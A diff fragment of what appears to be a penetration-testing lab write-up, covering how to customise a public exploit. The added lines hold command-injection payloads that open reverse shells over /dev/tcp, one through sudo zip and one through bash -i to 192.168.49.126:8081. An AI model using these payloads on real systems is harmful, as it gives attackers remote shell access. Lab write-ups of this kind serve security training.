@@ -64,7 +64,9 @@ Shellcodes: No Results
 
 ## customize exploit
 The exploit does not trigger a reverse shell out of the box.  
+
 The payload needs to be changed: ```payload = ''' `touch /tmp/.'''+fake_user+'''.txt;sudo zip -q /tmp/.'''+fake_user+'''.zip /tmp/.'''+fake_user+'''.txt -T -TT '/bin/sh -i>& /dev/tcp/{0}/{1} 0>&1 #'` '''.format(ip, port)```  
+  
 We are changing the payload variable to ```payload = ''' `bash -c 'bash -i >& /dev/tcp/192.168.49.126/8081 0>&1'` '''```
 
 ## start listener on attacker machine
